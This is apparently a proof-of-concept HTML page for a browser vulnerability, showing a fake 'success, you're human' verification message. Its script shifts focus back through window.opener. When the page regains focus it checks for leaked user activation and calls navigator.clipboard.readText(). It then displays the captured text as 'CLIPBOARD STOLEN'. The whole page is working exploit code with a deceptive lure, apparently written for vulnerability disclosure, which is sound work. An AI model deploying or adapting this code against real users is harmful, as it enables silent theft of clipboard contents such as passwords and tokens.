<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>PoC - Target Page (Vulnerable Origin)</title>
</head>

<body style="background: #e3f2fd; font-family: sans-serif; text-align: center; padding: 50px;">
    <h1>success, you're human</h1>
    <script>
        if (window.opener) {
            setTimeout(() => {
                window.opener.focus();
            }, 500);
        }

        let triggered = false;

        function checkAndExploit(triggerSource) {
            const isActive = navigator.userActivation.isActive;
            console.log(`[${triggerSource}] Activation state:`, isActive);

            if (isActive && !triggered) {
                triggered = true;
                console.log("[!] Activation leak detected. Triggering Clipboard Read...");
                navigator.clipboard.readText()
                    .then((text) => {
                        console.log("[!!!] CLIPBOARD STOLEN:", text);
                        alert("EXPLOIT SUCCESS!\n\nUser Activation leaked.\nI can see your clipboard content:\n\n" + text);
                        triggered = false;
                    })
                    .catch(e => {
                        console.log("Clipboard API blocked/dismissed:", e.message);
                        triggered = false;
                    });
            }
        }

        window.addEventListener("focus", () => checkAndExploit("focus"));
        window.addEventListener("pageshow", () => checkAndExploit("pageshow"));
    </script>
</body>

</html>
